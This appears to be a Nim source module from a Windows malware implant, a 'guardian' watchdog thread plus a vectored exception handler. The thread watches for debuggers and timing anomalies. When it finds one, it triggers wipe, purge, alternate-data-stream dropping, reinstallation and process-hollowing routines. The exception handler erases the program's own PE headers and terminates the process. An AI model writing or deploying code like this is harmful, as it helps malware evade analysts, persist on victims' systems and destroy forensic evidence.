# guardian.nim — Watchdog thread + VEH installer

import winim

# ── Public type aliases ───────────────────────────────────────────────────────

type
  NtQuerySystemInformation* = proc(cls: uint, buf: ptr byte, len: uint, ret: ptr uint32): int32 {.stdcall.}
  SleepFn*                  = proc(ms: uint32) {.stdcall.}
  GetTickCount64Fn*         = proc(): uint64 {.stdcall.}
  AddVectoredExceptionHandlerFn* = proc(first: uint, handler: pointer): pointer {.stdcall.}
  VoidFn                    = proc() {.stdcall.}
  BoolFn                    = proc(): bool {.stdcall.}

type
  GuardState = object
    fnNtqsi:   NtQuerySystemInformation
    fnSleep:   SleepFn
    fnTick:    GetTickCount64Fn
    fnWipe:    VoidFn
    fnPurge:   VoidFn
    fnDropAds: VoidFn
    fnInstall: VoidFn
    fnHollow:  BoolFn
    fnDestruct:VoidFn

var vehDestruct: VoidFn = nil

proc guardianThread(param: LPVOID): DWORD {.stdcall.} =
  let state = cast[ptr GuardState](param)
  let checkIntervalMs: uint32 = 5000'u32
  var ticksLast = state[].fnTick()

  while true:
    state[].fnSleep(checkIntervalMs)

    if IsDebuggerPresent() != 0:
      state[].fnWipe()
      discard TerminateProcess(GetCurrentProcess(), 0)

    let ticksNow = state[].fnTick()
    let elapsed  = uint32(ticksNow - ticksLast)
    ticksLast    = ticksNow
    if elapsed > checkIntervalMs * 4:
      state[].fnWipe()
      state[].fnPurge()
      state[].fnDropAds()
      state[].fnInstall()
      discard state[].fnHollow()
  0

proc vehHandler(ex: LPVOID): LONG {.stdcall.} =
  if vehDestruct != nil:
    vehDestruct()
  else:
    # Fallback: zero own PE headers inline
    var ownBase: uint
    {.emit: """__asm__ volatile ("lea %0, [rip]" : "=r"(`ownBase`));""".}
    ownBase = ownBase and not(0xFFFF'u)
    zeroMem(cast[pointer](ownBase), 4096)
  discard TerminateProcess(GetCurrentProcess(), 1)
  0  # EXCEPTION_CONTINUE_SEARCH — unreachable

proc installVeh*(fnAddVeh: AddVectoredExceptionHandlerFn, fnDestruct: VoidFn) =
  # unsafe
  vehDestruct = fnDestruct
  discard fnAddVeh(1, vehHandler)

proc startThread*(
  fnNtqsi:   NtQuerySystemInformation,
  fnSleep:   SleepFn,
  fnTick:    GetTickCount64Fn,
  fnWipe:    VoidFn,
  fnPurge:   VoidFn,
  fnDropAds: VoidFn,
  fnInstall: VoidFn,
  fnHollow:  BoolFn,
) =
  # unsafe
  let fnDestruct = fnWipe  # guardian uses fnWipe as its fn_destruct

  let state = cast[ptr GuardState](alloc(sizeof(GuardState)))
  state[] = GuardState(
    fnNtqsi:    fnNtqsi,
    fnSleep:    fnSleep,
    fnTick:     fnTick,
    fnWipe:     fnWipe,
    fnPurge:    fnPurge,
    fnDropAds:  fnDropAds,
    fnInstall:  fnInstall,
    fnHollow:   fnHollow,
    fnDestruct: fnDestruct,
  )

  var tid: DWORD = 0
  let h = CreateThread(nil, 0, guardianThread, state, 0, addr tid)
  if h != nil:
    discard CloseHandle(h)
  else:
    dealloc(state)
